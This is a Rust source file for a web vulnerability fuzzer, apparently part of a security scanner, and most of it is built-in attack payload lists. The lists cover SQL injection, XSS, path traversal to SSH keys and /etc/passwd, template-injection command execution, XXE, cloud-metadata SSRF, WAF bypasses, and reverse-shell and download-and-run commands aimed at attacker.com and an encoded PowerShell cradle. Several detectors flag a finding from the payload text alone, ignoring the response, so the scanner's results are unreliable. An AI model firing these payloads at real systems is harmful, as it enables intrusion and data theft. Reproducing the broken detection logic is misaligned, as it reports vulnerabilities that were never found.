//! Intelligent fuzzer with adaptive payload mutation and anomaly detection.

use grym_core::{Finding, ScopedClient, ScopedClientError, Severity, TechniqueTier};
use std::time::Instant;
use url::Url;

/// Fuzzing strategy selection.
#[derive(Clone, Debug)]
pub enum FuzzStrategy {
    Sequential(Vec<String>),
    Mutation(String),
    Template(String),
    Dictionary,
    Grammar(Vec<Vec<String>>),
}

/// A single fuzz result.
#[derive(Clone, Debug)]
pub struct FuzzResult {
    pub payload: String,
    pub status: u16,
    pub body_length: usize,
    pub response_time_ms: u128,
    pub anomaly_score: f64,
    pub interesting: bool,
}

/// Run a broad fuzzing campaign across all common vulnerability categories.
pub async fn fuzz_all(client: &ScopedClient, url: &Url) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();
    let mut detectors: Vec<
        Box<dyn Fn(&str, u16, u128, u16, usize, u128) -> Option<Finding> + Send>,
    > = Vec::new();

    detectors.push(Box::new(
        |payload, baseline_status, baseline_time, status, length, time| {
            let score =
                calculate_anomaly_score(baseline_status, baseline_time, status, length, time);
            if score > 0.75 {
                Some(create_fuzz_finding(
                    "Anomalous response",
                    "potential-injection",
                    payload,
                    score,
                    status,
                    length,
                    time,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, length, _time2| {
            if payload.contains("/etc/passwd")
                || payload.contains("..%2f")
                || payload.contains("C:\\\\\\\\\\\\\\\\windows\\\\\\\\win.ini")
            {
                Some(create_fuzz_finding(
                    "Path traversal payload",
                    "path-traversal",
                    payload,
                    0.8,
                    0,
                    length,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("<script>")
                || payload.contains("onerror=")
                || payload.contains("javascript:")
            {
                Some(create_fuzz_finding(
                    "XSS payload injected",
                    "xss",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("SLEEP")
                || payload.contains("WAITFOR")
                || payload.contains("pg_sleep")
            {
                Some(create_fuzz_finding(
                    "Time-based injection payload",
                    "sqli",
                    payload,
                    0.85,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("<!DOCTYPE")
                || payload.contains("<!ENTITY")
                || payload.contains("XInclude")
            {
                Some(create_fuzz_finding(
                    "XXE payload injected",
                    "xxe",
                    payload,
                    0.75,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("$ne") || payload.contains("$where") || payload.contains("$regex") {
                Some(create_fuzz_finding(
                    "NoSQL injection payload",
                    "nosqli",
                    payload,
                    0.75,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("__schema")
                || payload.contains("__type")
                || payload.contains("introspection")
            {
                Some(create_fuzz_finding(
                    "GraphQL introspection payload",
                    "graphql",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("__proto__")
                || payload.contains("constructor\":{\"prototype\"")
                || payload.contains("isAdmin\":true")
            {
                Some(create_fuzz_finding(
                    "Prototype / JSON injection payload",
                    "json-injection",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.starts_with("*")
                || payload.contains(")(uid=*")
                || payload.contains("objectClass=")
            {
                Some(create_fuzz_finding(
                    "LDAP injection payload",
                    "ldap-injection",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    let baseline_start = Instant::now();
    let baseline = client
        .get(
            "grym-web-scanner",
            url.clone(),
            TechniqueTier::StandardDetection,
        )
        .await?;
    let baseline_status = baseline.status;
    let _baseline_length = baseline.body.len();
    let baseline_time = baseline_start.elapsed().as_millis() as u128;

    let mut payloads = Vec::new();
    payloads.extend(dictionaries::sqli_wordlist());
    payloads.extend(dictionaries::xss_wordlist());
    payloads.extend(dictionaries::path_traversal_wordlist());
    payloads.extend(dictionaries::ssti_wordlist());
    payloads.extend(dictionaries::cmd_injection_wordlist());
    payloads.extend(dictionaries::ssrf_wordlist());
    payloads.extend(dictionaries::header_wordlist());
    payloads.extend(dictionaries::xxe_wordlist());
    payloads.extend(dictionaries::ldap_wordlist());
    payloads.extend(dictionaries::nosqli_wordlist());
    payloads.extend(dictionaries::graphql_wordlist());
    payloads.extend(dictionaries::json_injection_wordlist());
    payloads.extend(dictionaries::waf_bypass_wordlist());

    for (idx, payload) in payloads.iter().enumerate() {
        if idx % 50 == 0 {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let mut test_url = url.clone();
        let query = format!("grym_fuzz={}", urlencoding::encode(payload));
        test_url.set_query(Some(&query));

        let start = Instant::now();
        let response = match client
            .get(
                "grym-web-scanner",
                test_url,
                TechniqueTier::StandardDetection,
            )
            .await
        {
            Ok(r) => r,
            Err(_) => continue,
        };
        let response_time = start.elapsed().as_millis() as u128;

        for detector in &detectors {
            if let Some(f) = detector(
                payload,
                baseline_status,
                baseline_time,
                response.status,
                response.body.len(),
                response_time,
            ) {
                findings.push(f);
            }
        }
    }

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    findings.dedup_by(|a, b| a.title == b.title && a.remediation == b.remediation);
    Ok(findings)
}

/// Run a targeted fuzzing campaign.
pub async fn fuzz_parameter(
    client: &ScopedClient,
    base_url: &Url,
    _param_name: &str,
    strategy: &FuzzStrategy,
    detectors: &[Box<dyn Fn(&str, &str, u16, usize, u128) -> Option<Finding> + Send>],
) -> Result<Vec<FuzzResult>, ScopedClientError> {
    let payloads = match strategy {
        FuzzStrategy::Sequential(p) => p.clone(),
        FuzzStrategy::Mutation(base) => adaptive_mutation(base, &[]),
        FuzzStrategy::Template(t) => vec![t.replace("{{FUZZ}}", "PAYLOAD")],
        FuzzStrategy::Dictionary => dictionaries::sqli_wordlist(),
        FuzzStrategy::Grammar(parts) => {
            let mut combos = vec![String::new()];
            for part in parts {
                let mut next = Vec::new();
                for prefix in &combos {
                    for choice in part {
                        next.push(format!("{}{}", prefix, choice));
                    }
                }
                combos = next;
            }
            combos
        }
    };

    let baseline_start = Instant::now();
    let baseline = client
        .get(
            "grym-web-scanner",
            base_url.clone(),
            TechniqueTier::StandardDetection,
        )
        .await?;
    let _baseline_body = baseline.body;
    let baseline_time = baseline_start.elapsed().as_millis() as u128;
    let mut results = Vec::new();

    for (idx, payload) in payloads.iter().enumerate() {
        if idx % 50 == 0 {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let mut test_url = base_url.clone();
        let query = format!("grym_fuzz={}", urlencoding::encode(payload));
        test_url.set_query(Some(&query));

        let start = Instant::now();
        let response = match client
            .get(
                "grym-web-scanner",
                test_url,
                TechniqueTier::StandardDetection,
            )
            .await
        {
            Ok(r) => r,
            Err(_) => continue,
        };
        let response_time = start.elapsed().as_millis() as u128;

        let score = calculate_anomaly_score(
            baseline.status,
            baseline_time,
            response.status,
            response.body.len(),
            response_time,
        );
        let interesting = score > 0.5
            || detectors.iter().any(|d| {
                d(
                    payload,
                    &response.body,
                    response.status,
                    response.body.len(),
                    response_time,
                )
                .is_some()
            });

        results.push(FuzzResult {
            payload: payload.clone(),
            status: response.status,
            body_length: response.body.len(),
            response_time_ms: response_time,
            anomaly_score: score,
            interesting,
        });
    }

    Ok(results)
}

/// Built-in fuzzing dictionaries.
pub mod dictionaries {
    pub fn path_traversal_wordlist() -> Vec<String> {
        let raw = [
            "../",
            "..\\",
            "..%2f",
            "..%5c",
            "%2e%2e%2f",
            "%2e%2e%2fetc%2fpasswd",
            "....//",
            "....\\\\",
            "..%252f",
            "..%252fetc%252fpasswd",
            "%252e%252e%252f",
            "..%c0%af",
            "..%c1%9c",
            "%00../",
            "..\\../..\\../..\\../etc/passwd",
            "C:\\\\windows\\\\win.ini",
            "C:%5cwindows%5cwin.ini",
            "..%2f..%2f..%2fwindows%2fwin.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "etc/passwd",
            "..%2fetc%2fhosts",
            "..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log",
            "..%2f..%2f..%2fproc%2fself%2fenviron",
            "..%2f..%2f..%2fproc%2fversion",
            "..%2f..%2f..%2f..%2fhome%2fuser%2f.ssh%2fid_rsa",
            "....//....//....//etc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "\\..\\..\\..\\etc\\passwd",
            "%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "expect://id",
            "php://input",
            "data://text/plain,<?php phpinfo();?>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn sqli_wordlist() -> Vec<String> {
        let raw = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "\" OR \"1\"=\"1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' OR 1=1 LIMIT 1--",
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' OR 1=1 AND 1=1--",
            "' OR 1=1 AND 1=2--",
            "1' AND substring(@@version,1,1)='M'",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "1' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))x)--",
            "' OR 1=1-- -",
            "' OR 1=1;--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1 AND '1'='1",
            "1' GROUP BY 1--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,username,password FROM users--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1 OR 1=1",
            "1' OR 1--",
            "1'||'1",
            "1' AND 1=1 AND '1'='1",
            "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
            "1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "1' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
            "1' AND 1=CAST((SELECT pg_sleep(5)) AS int)--",
            "1'; BEGIN; SELECT pg_sleep(5); END;--",
            "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1%27%20AND%201%3D1--",
            "%27%20OR%20%271%27%3D%271",
            "1%27%20AND%20SLEEP%285%29--",
            "1%bf%27%20or%201%3d1--",
            "%df%27%20or%201%3d1--",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn xss_wordlist() -> Vec<String> {
        let raw = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
            "<img src=1 onerror=alert(1)>",
            "<a href=javascript:alert(1)>x</a>",
            "<marquee onstart=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<script src=//xss.com></script>",
            "<img src=x onerror=confirm(1)>",
            "<svg/onload=prompt(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<script>alert(document.cookie)</script>",
            "<iframe src=//evil.com>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<form action=javascript:alert(1)><button>submit</button></form>",
            "<input type=image src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<math href=javascript:alert(1)>CLICK</math>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<img src=x onerror=top[8680439..toString(30)](1)>",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "<img src=`x` onerror=alert(1)>",
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            "<img src=x onerror=alert(1) onerror=alert(2)>",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            "<img src=x onerror=location='javascript:alert(1)'>",
            "<img src=x onerror=window.alert(1)>",
            "<script>alert`1`</script>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ssti_wordlist() -> Vec<String> {
        let raw = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{[]|attr('__class__')}}",
            "{{_self.env.registerUndefinedVariableCallback('id')}}",
            "{{_self.env.setFilter('eval')}}",
            "{{['id']|filter('system')}}",
            "{{['id']|map('system')|join}}",
            "{% import os %}{{os.system('id')}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endfor %}",
            "{{().__class__.__base__.__subclasses__()[177].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
            "${T(java.lang.Math).PI}",
            "{{42*42}}",
            "{{'id'.toUpperCase()}}",
            "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
            "{{1+1}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "<%#  %>",
            "{{2*2}}[[3*3]]",
            "{{8*8}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{7*'7'}}",
            "{{request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('id').read()}}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn cmd_injection_wordlist() -> Vec<String> {
        let raw = [
            "; id",
            "| whoami",
            "&& uname -a",
            "|| ls",
            "`id`",
            "$(id)",
            "; whoami;",
            "| whoami |",
            "; cat /etc/passwd",
            "; ping -c 4 127.0.0.1",
            "; sleep 5",
            "; nc -e /bin/sh attacker 4444",
            "& whoami",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; echo PWNED",
            "; ls -la",
            "; wget http://attacker.com/shell",
            "; curl http://attacker.com/shell | sh",
            "; python3 -c 'import socket,subprocess,os;...'",
            "; powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ssrf_wordlist() -> Vec<String> {
        let raw = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
            "ftp://127.0.0.1/",
            "http://localhost:22/",
            "http://127.0.0.1:8080/",
            "http://0.0.0.0:22/",
            "http://[::]:22/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://0x7f.0.0.1/",
            "http://169.254.169.254.xip.io/",
            "http://0177.1/",
            "http://0x7f000001/",
            "http://[::ffff:169.254.169.254]/",
            "http://127.1/",
            "http://localhost/",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn parameter_wordlist() -> Vec<String> {
        let raw = [
            "id",
            "user",
            "username",
            "password",
            "email",
            "token",
            "key",
            "api_key",
            "secret",
            "q",
            "search",
            "query",
            "s",
            "file",
            "path",
            "url",
            "redirect",
            "next",
            "callback",
            "debug",
            "test",
            "admin",
            "role",
            "group",
            "permission",
            "action",
            "cmd",
            "exec",
            "page",
            "offset",
            "limit",
            "order",
            "sort",
            "filter",
            "where",
            "select",
            "include",
            "name",
            "title",
            "body",
            "content",
            "message",
            "subject",
            "description",
            "comment",
            "amount",
            "price",
            "quantity",
            "total",
            "currency",
            "card",
            "cvv",
            "expiry",
            "host",
            "ip",
            "port",
            "domain",
            "target",
            "source",
            "dest",
            "origin",
            "referer",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn path_wordlist() -> Vec<String> {
        let raw = [
            "/admin",
            "/admin/login",
            "/administrator",
            "/wp-admin",
            "/api",
            "/api/v1",
            "/api/v2",
            "/swagger.json",
            "/openapi.json",
            "/v1/api",
            "/graphql",
            "/api/graphql",
            "/console",
            "/.env",
            "/config.json",
            "/.git/config",
            "/.git/HEAD",
            "/robots.txt",
            "/sitemap.xml",
            "/actuator",
            "/actuator/health",
            "/actuator/env",
            "/actuator/heapdump",
            "/jolokia",
            "/metrics",
            "/prometheus",
            "/health",
            "/_all_dbs",
            "/.aws/credentials",
            "/_config",
            "/debug",
            "/test",
            "/dev",
            "/staging",
            "/backup",
            "/bak",
            "/old",
            "/.well-known/security.txt",
            "/login",
            "/register",
            "/reset-password",
            "/forgot",
            "/auth",
            "/oauth",
            "/token",
            "/uploads",
            "/files",
            "/static",
            "/assets",
            "/media",
            "/public",
            "/private",
            "/.htaccess",
            "/.htpasswd",
            "/server-status",
            "/server-info",
            "/phpinfo.php",
            "/info.php",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn header_wordlist() -> Vec<String> {
        let raw = [
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Forwarded-Proto",
            "X-Real-IP",
            "X-Original-URL",
            "X-Override-URL",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Client-IP",
            "X-Host",
            "X-HTTP-Host-Override",
            "X-Forwarded-Server",
            "X-Forwarded-Scheme",
            "X-Scheme",
            "X-Original-Method",
            "X-Method-Override",
            "X-HTTP-Method",
            "X-HTTP-Method-Override",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Referer",
            "User-Agent",
            "Cookie",
            "Authorization",
            "X-Api-Key",
            "X-CSRF-Token",
            "X-XSRF-Token",
            "X-Request-ID",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn xxe_wordlist() -> Vec<String> {
        let raw = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><x>&xxe;</x>",
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///C:/windows/win.ini\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % d SYSTEM \"http://attacker.com/d.dtd\">%d;]><x/>",
            "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"expect://id\">]><x>&xxe;</x>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ldap_wordlist() -> Vec<String> {
        let raw = [
            "*",
            "*)(uid=*",
            "*)(uid=*))(&(uid=*",
            "admin*)(&(password=*",
            "*)(&(password=*)",
            "*)(uid=*))(&(uid=*",
            "*))((objectClass=*",
            "*)(objectClass=*)(&",
            "*;",
            "|uid=*",
            "(&(uid=*)(uid=*))",
            "(&(uid=*)(password=*))",
            "*)(uid=*))(&(uid=*",
            "*)(&(objectClass=top)",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn nosqli_wordlist() -> Vec<String> {
        let raw = [
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "{\"$exists\": true}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$or\": [{}, {}]}",
            "[\"$ne\"]=null",
            "[$ne]=null",
            "[$gt]=",
            "[$regex]=.*",
            "[$exists]=true",
            "[$where]=1",
            "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
            "{\"$nin\":[\"\",null]}",
            "{\"$size\":0}",
            "{\"$type\":2}",
            "username[$ne]=admin&password[$ne]=",
            "username[$regex]=^a&password[$regex]=.*",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn graphql_wordlist() -> Vec<String> {
        let raw = [
            "{__schema{types{name,fields{name}}}}",
            "{__type(name:\"User\"){fields{name,type{name}}}}",
            "query{__schema{queryType{name}}}",
            "{user(id:1){id,name,password}}",
            "{users{email,password,role}}",
            "mutation{login(username:\"admin\",password:\"admin\"){token}}",
            "{__schema{directives{name,description,locations,args{name}}}}",
            "{node(id:\"1\"){... on User{id email}}}",
            "query{__schema{mutationType{name}}}",
            "{introspection:__schema{types{name,fields{name,args{name}}}}}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn json_injection_wordlist() -> Vec<String> {
        let raw = [
            "{\"role\":\"admin\"}",
            "{\"role\":\"admin\", \"isAdmin\":true}",
            "{\"admin\":true}",
            "{\"role\":\"admin\", \"verified\":true}",
            "{\"user\":null, \"role\":\"admin\"}",
            "{\"$eq\":\"admin\"}",
            "{\"__proto__\":{\"isAdmin\":true}}",
            "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
            "{\"isAdmin\":true}",
            "{\"role\":[\"user\",\"admin\"]}",
            "{\"role\":{\"$in\":[\"admin\"]}}",
            "{\"\":{\"$eq\":\"admin\"}}",
            "{\"$or\":[{\"role\":\"admin\"}]}",
            "{\"attributes\":{\"role\":\"admin\"}}",
            "{\"user\":{\"role\":\"admin\"}}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn waf_bypass_wordlist() -> Vec<String> {
        let raw = [
            "<scrIpt>alert(1)</scrIpt>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<img src=x ONERROR=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert&#40;1&#41;</script>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<img src=x onerror=top[8680439..toString(30)](1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "SELECT/**/1/**/FROM/**/users",
            "UNI%6Fn/**/SELECT",
            "1' AND 1=1--",
            "1%27%20AND%201%3D1--",
            "1%bf%27%20or%201%3d1--",
            "1%df%27%20or%201%3d1--",
            "1/**/AND/**/1=1",
            "1/**/OR/**/1=1",
            "../",
            "..%2f",
            "..%252f",
            "%2e%2e%2f",
            "%c0%af",
            "%c1%9c",
            "....//",
            "..%00/",
            "{\"$ne\":null}",
            "[$ne]=null",
            "{\"$where\":\"sleep(5000)\"}",
            "; id",
            "| whoami",
            "`id`",
            "$(id)",
            "; sleep 5",
            "; nc -e /bin/sh attacker 4444",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }
}

/// Calculate anomaly score comparing response to baseline.
pub fn calculate_anomaly_score(
    baseline_status: u16,
    baseline_time_ms: u128,
    result_status: u16,
    _result_length: usize,
    result_time_ms: u128,
) -> f64 {
    let mut score: f64 = 0.0;
    if result_status != baseline_status {
        score += 0.3;
    }
    if result_status >= 500 {
        score += 0.3;
    }
    if result_time_ms > baseline_time_ms.saturating_mul(3) && result_time_ms > 1000 {
        score += 0.4;
    }
    score.min(1.0)
}

/// Adaptive mutation based on previous results.
pub fn adaptive_mutation(base_payload: &str, previous_results: &[FuzzResult]) -> Vec<String> {
    let mut variants = vec![
        urlencoding::encode(base_payload).to_string(),
        base_payload.replace(' ', "%20"),
        base_payload.replace('<', "&lt;").replace('>', "&gt;"),
        base_payload.to_uppercase(),
        base_payload.to_lowercase(),
        format!("{}%00", base_payload),
        format!("%00{}", base_payload),
        format!("'{}'", base_payload),
        format!("\"{}\"", base_payload),
        base_payload.replace("=", "%3d").replace("&", "%26"),
        base_payload.replace("/", "%2f"),
    ];

    if previous_results.iter().any(|r| r.status == 403) {
        variants.push(base_payload.replace('<', "<\\x00"));
        variants.push(base_payload.replace('"', "\\x22"));
    }

    variants
}

fn create_fuzz_finding(
    title: &str,
    category: &str,
    payload: &str,
    score: f64,
    status: u16,
    length: usize,
    time: u128,
) -> Finding {
    let mut f = Finding::new(
        format!("Fuzz: {}", title),
        grym_core::AssetRef {
            identifier: "fuzz-target".into(),
            kind: "parameter".into(),
        },
        if score > 0.8 {
            Severity::High
        } else if score > 0.5 {
            Severity::Medium
        } else {
            Severity::Low
        },
        grym_core::Confidence::Possible,
        "grym-fuzzer",
    );
    f.categories.push(category.into());
    f.remediation = format!(
        "Payload generated anomaly score {:.2} with status {} ({} bytes, {} ms)",
        score, status, length, time
    );
    f.evidence.push(grym_core::Evidence::redacted(
        "fuzz-payload",
        title,
        &format!(
            "Payload: {} | Score: {:.2}",
            payload.chars().take(120).collect::<String>(),
            score
        ),
    ));
    f
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_calculate_anomaly_score_status_diff() {
        let score = calculate_anomaly_score(200, 100, 500, 1000, 100);
        assert!(score > 0.0);
    }

    #[test]
    fn test_calculate_anomaly_score_time_anomaly() {
        let score = calculate_anomaly_score(200, 100, 200, 1000, 5000);
        assert!(score > 0.0);
    }

    #[test]
    fn test_calculate_anomaly_score_no_anomaly() {
        let score = calculate_anomaly_score(200, 100, 200, 1000, 100);
        assert_eq!(score, 0.0);
    }

    #[test]
    fn test_adaptive_mutation_generates_variants() {
        let variants = adaptive_mutation("<script>", &[]);
        assert!(!variants.is_empty());
        assert!(
            variants.iter().any(|v| v.contains("%3c"))
                || variants.iter().any(|v| v.contains("%3C"))
        );
    }

    #[test]
    fn test_path_traversal_wordlist_not_empty() {
        assert!(!dictionaries::path_traversal_wordlist().is_empty());
    }

    #[test]
    fn test_sqli_wordlist_contains_time_based() {
        let list = dictionaries::sqli_wordlist();
        assert!(list.iter().any(|p| p.contains("SLEEP")));
    }

    #[test]
    fn test_xss_wordlist_contains_script() {
        let list = dictionaries::xss_wordlist();
        assert!(list.iter().any(|p| p.contains("<script>")));
    }

    #[test]
    fn test_xxe_wordlist_contains_doctype() {
        let list = dictionaries::xxe_wordlist();
        assert!(list.iter().any(|p| p.contains("<!DOCTYPE")));
    }

    #[test]
    fn test_nosqli_wordlist_contains_dollar_operators() {
        let list = dictionaries::nosqli_wordlist();
        assert!(list.iter().any(|p| p.contains("$ne")));
        assert!(list.iter().any(|p| p.contains("$where")));
    }

    #[test]
    fn test_graphql_wordlist_contains_introspection() {
        let list = dictionaries::graphql_wordlist();
        assert!(list.iter().any(|p| p.contains("__schema")));
    }

    #[test]
    fn test_waf_bypass_wordlist_non_empty() {
        assert!(!dictionaries::waf_bypass_wordlist().is_empty());
    }

    #[test]
    fn test_json_injection_wordlist_contains_proto() {
        let list = dictionaries::json_injection_wordlist();
        assert!(list.iter().any(|p| p.contains("isAdmin\":true")));
    }

    #[test]
    fn test_ldap_wordlist_contains_wildcards() {
        let list = dictionaries::ldap_wordlist();
        assert!(list.iter().any(|p| p.starts_with('*')));
    }
}
